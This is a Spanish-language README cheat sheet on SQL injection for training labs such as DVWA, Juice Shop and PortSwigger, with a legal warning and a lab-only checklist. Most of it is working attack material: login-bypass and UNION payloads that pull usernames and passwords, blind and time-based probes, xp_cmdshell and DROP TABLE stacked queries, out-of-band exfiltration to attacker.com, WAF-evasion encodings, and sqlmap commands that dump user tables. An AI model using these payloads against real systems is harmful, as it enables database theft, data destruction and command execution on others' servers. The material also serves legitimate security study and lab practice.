<div align="center">

# 💉 SQL Injection
### Detección, Confirmación y Explotación en Labs

![Status](https://img.shields.io/badge/Status-Active-ff3c6e?style=for-the-badge&logo=statuspage&logoColor=white)
![Category](https://img.shields.io/badge/Category-SQL%20Injection-00d4ff?style=for-the-badge&logo=owasp&logoColor=white)
![Tool](https://img.shields.io/badge/Main%20Tool-Caido-00ff88?style=for-the-badge)

</div>

---

> **SQL Injection:** el input del usuario se concatena directamente en la query SQL sin sanitizar. La base de datos no puede distinguir entre sintaxis real y la inyectada, ejecutando ambas. Dependiendo del comportamiento del servidor: error-based, union-based, blind booleano, time-based u out-of-band.

> [!WARNING]
> **Aviso Legal y Ético:** Uso exclusivo en entornos con **autorización explícita por escrito (RoE).** El uso no autorizado constituye un delito penal.

---

## 📑 Tabla de Contenidos

| # | Sección |
|---|---------|
| 01 | [🎯 Labs Objetivo](#-labs-objetivo) |
| 02 | [🛠️ Herramientas](#️-herramientas) |
| 03 | [🔍 Indicadores](#-indicadores) |
| 04 | [🧪 Payloads Base](#-payloads-base) |
| 05 | [🧱 Payloads Avanzados](#-payloads-avanzados) |
| 06 | [🛡️ Bypass de Filtros](#️-bypass-de-filtros) |
| 07 | [🔁 Flujo con Caido](#-flujo-con-caido) |
| 08 | [⚙️ Comandos Útiles](#️-comandos-útiles) |
| 09 | [🧠 Casos Típicos](#-casos-típicos) |
| 10 | [🧭 Ruta de Práctica](#-ruta-de-práctica) |
| 11 | [📝 Checklist](#-checklist) |

---

## 🎯 Labs Objetivo

| Plataforma | Labs recomendados |
|-----------|-------------------|
| **DVWA** | SQL Injection, SQL Injection (Blind) |
| **Juice Shop** | Login Admin, Login Jim, Login Bender, Database Schema |
| **PortSwigger** | SQL injection learning path |

---

## 🛠️ Herramientas

![Tool](https://img.shields.io/badge/Tool-Caido-00ff88?style=flat-square)
![Tool](https://img.shields.io/badge/Tool-sqlmap-ff3c6e?style=flat-square)
![Tool](https://img.shields.io/badge/Tool-curl-00d4ff?style=flat-square)

| Herramienta | Uso |
|-------------|-----|
| **Caido** | `HTTP History`, `Replay`, `Automate` |
| **sqlmap** | Automatización y confirmación en labs |
| **curl** | Reproducción rápida fuera de proxy |
| **jq** | Parseo de respuestas JSON/API |

---

## 🔍 Indicadores

![Context](https://img.shields.io/badge/Detección-Señales-ff6b00?style=flat-square)

Señales de SQLi potencial:

- error SQL visible en response (`syntax error`, `ORA-`, `SQLSTATE`)
- cambio de contenido con comilla simple `'`
- bypass de login con `' OR 1=1--`
- diferencia de contenido entre booleanos `1=1` vs `1=2`
- retraso temporal reproducible con `SLEEP(5)`
- respuesta válida con `UNION` de columnas correctas
- HTTP 500 solo al inyectar `'`

> [!TIP]
> Probar siempre `'` sola primero. Un error de base de datos o comportamiento diferente es señal suficiente para continuar.

---

## 🧪 Payloads Base

### `[01]` Detección / Entry point probes

```text
'
"
;
)
%27
%22
' OR '1'='1
1 AND 1=1
1 AND 1=2
```

### `[02]` Login bypass

```text
' OR '1'='1'--
' OR 1=1--
' OR 1=1#
admin'--
admin'/*
admin' OR '1'='1
') OR ('1'='1
' OR ''='
```

### `[03]` Boolean-based

```text
' AND 1=1-- -
' AND 1=2-- -
' OR '1'='1-- -
1' AND (SELECT 'x' FROM users LIMIT 1)='x'--
1' AND LENGTH(@@hostname)=14--
```

### `[04]` UNION — detectar número de columnas

```text
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
' ORDER BY 4-- - (error aquí = 3 columnas)

' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
```

> [!NOTE]
> UNION requiere el mismo número de columnas que la query original. Usar `ORDER BY` incremental hasta error, luego confirmar con `UNION SELECT NULL`.

### `[05]` UNION — extracción

```text
' UNION SELECT @@version,NULL-- -
' UNION SELECT username,password FROM users-- -
1' UNION SELECT table_name,NULL FROM information_schema.tables-- -
1' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
```

### `[06]` Time-based

```text
' AND SLEEP(5)-- -                         (MySQL)
'; WAITFOR DELAY '0:0:5'-- -               (MSSQL)
'||(SELECT pg_sleep(5))-- -                (PostgreSQL)
'; dbms_pipe.receive_message(('a'),5)-- -  (Oracle)
1' AND BENCHMARK(5000000,MD5(1))-- -       (MySQL, alternativa)
```

---

## 🧱 Payloads Avanzados

![Context](https://img.shields.io/badge/Técnica-Avanzada-a855f7?style=flat-square)

### `[01]` Error-based (MySQL)

```text
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE())))-- -
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT VERSION())),1)-- -
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT DATABASE()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
```

### `[02]` Error-based (MSSQL)

```text
' AND 1=CONVERT(int,(SELECT @@version))-- -
' UNION SELECT @@version-- -
```

### `[03]` Error-based (PostgreSQL)

```text
' AND 1=CAST(version() AS INTEGER)-- -
' UNION SELECT version();-- -
```

### `[04]` Error-based (Oracle)

```text
' UNION SELECT banner FROM v$version-- -
SELECT CASE WHEN (YOUR-CONDITION) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
```

### `[05]` Blind — extracción carácter a carácter

```text
1' AND ASCII(SUBSTRING(@@hostname,1,1))>64-- -
1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'-- -
1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='p'-- -
```

### `[06]` Stacked queries (MSSQL/PostgreSQL)

```text
1; EXEC xp_cmdshell('whoami')-- -
1; DROP TABLE users-- -
1; SELECT pg_sleep(5)-- -
```

### `[07]` Out-of-Band (OOB)

```text
' UNION SELECT LOAD_FILE(CONCAT('\\\\',DATABASE(),'.attacker.com\\a'))-- -   (MySQL/Windows)
'; EXEC master..xp_dirtree '//attacker.com/a'-- -                             (MSSQL)
```

### `[08]` Detección de DBMS

```text
connection_id()=connection_id()     MySQL
@@CONNECTIONS=@@CONNECTIONS         MSSQL
5::int=5                            PostgreSQL
ROWNUM=ROWNUM                       Oracle
sqlite_version()=sqlite_version()   SQLite
```

---

## 🛡️ Bypass de Filtros

![Context](https://img.shields.io/badge/Bypass-WAF%20%26%20Filtros-ff3c6e?style=flat-square)

### Sin espacios

```text
1/*comment*/AND/**/1=1/**/-- -
1/*!12345UNION*//*!12345SELECT*/1-- -
(1)and(1)=(1)-- -
%09, %0A, %0B, %0D, %A0   (whitespace alternativo)
```

### Sin coma

```text
LIMIT 1 OFFSET 0                   (en vez de LIMIT 0,1)
SUBSTR('SQL' FROM 1 FOR 1)         (en vez de SUBSTR('SQL',1,1))
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b ON 1=1
```

### Sin signo igual

```text
WHERE username REGEXP '^admin'
SUBSTRING(VERSION(),1,1) LIKE 5
SUBSTRING(VERSION(),1,1) BETWEEN 3 AND 4
SUBSTRING(VERSION(),1,1) NOT IN(4,3)
```

### Bypass de palabras clave (WAF)

```text
UNION   → uNiOn, Un/**/Io/**/n, %55nion
SELECT  → SeLeCt, sel%00ect, %53elect
OR      → ||, oR, %4fR
AND     → &&, aNd, %41ND
```

### Concatenación por DBMS (bypass keyword filters)

```text
MySQL:       CONCAT('adm','in')   o  'adm'+'in'
PostgreSQL:  'adm'||'in'
Oracle:      'adm'||'in'
MSSQL:       'adm'+'in'
```

### Variantes de comentario

```text
MySQL:       #,  -- (espacio),  /*comment*/
PostgreSQL:  --,  /*comment*/
Oracle:      --
MSSQL:       --,  /*comment*/
```

> [!IMPORTANT]
> Doble encoding `%2527` = `%27` = `'` — útil cuando el servidor decodifica el input dos veces.

---

## 🔁 Flujo con Caido

![Tool](https://img.shields.io/badge/Tool-Caido-00ff88?style=flat-square)

### `[01]` Capturar request

Buscar parámetros inyectables:

- filtros `category`, `id`, `product`
- campos `username` / `password`
- parámetros `search`, `q`
- cookies con valores enteros o strings

### `[02]` Replay manual

Probar en orden:

```text
'
' AND 1=1-- -
' AND 1=2-- -
```

Comparar: status, length, contenido del body.

### `[03]` Automatizar

Mandar a `Automate` con placeholder en parámetro vulnerable:

```text
'
' AND 1=1-- -
' AND 1=2-- -
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
```

### `[04]` Extraer comportamiento

Comparar en resultados de Automate:

- código HTTP
- longitud de respuesta
- palabras clave en body
- tiempo de respuesta

> [!IMPORTANT]
> Establecer baseline con request limpio antes de inyectar. La diferencia entre respuestas es la evidencia.

---

## ⚙️ Comandos Útiles

![Tool](https://img.shields.io/badge/Tool-sqlmap-ff3c6e?style=flat-square)

### sqlmap

```bash
# Básico sobre URL
sqlmap -u "http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit#" --batch

# Detectar bases de datos
sqlmap -u "http://target/search?q=test" -p q --batch --dbs

# Desde request guardado en Caido
sqlmap -r request.txt --batch --level 3 --risk 2

# Técnicas específicas
sqlmap -r request.txt -p id --technique=BEUSTQ --batch

# Extraer tablas de DB específica
sqlmap -r request.txt --batch -D target_db --tables

# Extraer columnas y datos
sqlmap -r request.txt --batch -D target_db -T users --dump
```

![Tool](https://img.shields.io/badge/Tool-curl-00d4ff?style=flat-square)

### curl

```bash
curl -i "http://dvwa.local/vulnerabilities/sqli/?id=1'&Submit=Submit#"
curl -i "http://dvwa.local/vulnerabilities/sqli/?id=1'+AND+1=1--+-&Submit=Submit#"
```

---

## 🧠 Casos Típicos

| Caso | Qué mirar |
|------|-----------|
| **WHERE clause** | contenido cambia con booleanos |
| **Login** | respuesta 302 / sesión creada |
| **UNION** | número de columnas y columnas tipo texto |
| **Blind boolean** | palabras `Welcome`, `Invalid`, tamaños de respuesta |
| **Blind time** | delta estable en segundos |
| **Error-based** | mensaje de DB en response con datos extraídos |
| **OOB** | DNS/HTTP callback en infraestructura controlada |

---

## 🧭 Ruta de Práctica

1. DVWA SQLi básico
2. DVWA SQLi Blind
3. PortSwigger: hidden data WHERE clause
4. PortSwigger: login bypass
5. PortSwigger: UNION / número de columnas
6. PortSwigger: boolean blind
7. PortSwigger: time-based blind
8. Juice Shop: retos de login

---

## 📝 Checklist

- [ ] input controlado identificado
- [ ] comportamiento diferencial validado
- [ ] DBMS inferido
- [ ] técnica elegida: error / union / blind / time
- [ ] evidencia guardada en Caido
- [ ] reproducido solo en lab

---

## 🔗 Referencias

- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings — SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [yogsec/SQL-Injection-Payloads](https://github.com/yogsec/SQL-Injection-Payloads)
